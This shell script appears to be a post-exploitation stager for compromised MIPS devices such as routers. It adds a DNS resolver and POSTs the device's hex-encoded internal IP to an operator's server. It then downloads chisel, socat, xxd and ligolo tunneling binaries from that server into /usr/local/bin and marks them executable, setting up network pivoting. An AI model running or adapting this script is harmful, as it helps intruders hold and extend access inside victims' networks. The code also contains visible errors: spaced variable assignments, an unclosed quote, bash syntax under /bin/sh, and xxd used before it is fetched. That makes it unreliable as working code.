#!/bin/sh

##### BEGIN CONFIG #####

DNS='1.1.1.1'

FILEPATH=srv
OUT_PATH=/usr/local/bin
CHISEL_BIN=mipsel-bin/chisel-mipsel
SOCAT_BIN=mipsel-bin/socat-mipsel
XXD_BIN=mipsel-bin/xxd-mipsel
LIGOLO_BIN=mipsel-bin/ligolo-mipsel

CHISEL_OUT_BIN=chisel
SOCAT_OUT_BIN=socat
XXD_OUT_BIN=xxd
LIGOLO_OUT_BIN=ligolo

##### END CONFIG #####

SRV_ADDR = "${1}"
WEBSRV = "${2}"
TARGET_IP = "${3}"
TARGET_PORT = "${4}"
EXTRA_ARG = "${5}

# Add DNS to resolv.conf
if [ -f /etc/resolv.conf ] && [ -z "$(grep -i '1.1.1.1' /etc/resolv.conf)" ] ; then
    if [ -f /usr/sbin/mergeresolv.sh ] ; then
        echo "nameserver ${DNS}" >> /etc/resolv.conf.def
        /usr/sbin/mergeresolv.sh
    fi
fi

if [[ "${WEBSRV}" -eq 1 ]]; then
    # Report back internal IP address of device in hex to internal web server
    GET_INTERNAL_IP=$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p)
    curl -d 'ip':$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p) -H 'Content-Type: application/json' -X POST http://${SRV_ADDR}/${GET_INTERNAL_IP}
fi

# Prepare file destination and transfer files
mkdir -p ${OUT_PATH}

if ! test -f ${OUT_PATH}/${CHISEL_OUT_BIN}; then
    curl http://${SRV_ADDR}/${FILEPATH}/${CHISEL_BIN} -o ${OUT_PATH}/${CHISEL_OUT_BIN}
    chmod +x ${OUT_PATH}/${CHISEL_OUT_BIN}
fi

if ! test -f ${OUT_PATH}/${SOCAT_OUT_BIN}; then
    curl http://${SRV_ADDR}/${FILEPATH}/${SOCAT_BIN} -o ${OUT_PATH}/${SOCAT_OUT_BIN}
    chmod +x ${OUT_PATH}/${SOCAT_OUT_BIN}
fi

if ! test -f ${OUT_PATH}/${XXD_OUT_BIN}; then
    curl http://${SRV_ADDR}/${FILEPATH}/${XXD_BIN} -o ${OUT_PATH}/${XXD_OUT_BIN}
    chmod +x ${OUT_PATH}/${XXD_OUT_BIN}
fi

if ! test -f ${OUT_PATH}/${LIGOLO_OUT_BIN}; then
    curl http://${SRV_ADDR}/${FILEPATH}/${LIGOLO_BIN} -o ${OUT_PATH}/${LIGOLO_OUT_BIN}
    chmod +x ${OUT_PATH}/${LIGOLO_OUT_BIN}
fi

if [[ "${WEBSRV}" -eq 1 ]]; then
    # Signal internal web server shutdown if running
    curl -X QUIT http://${SRV_ADDR}
fi
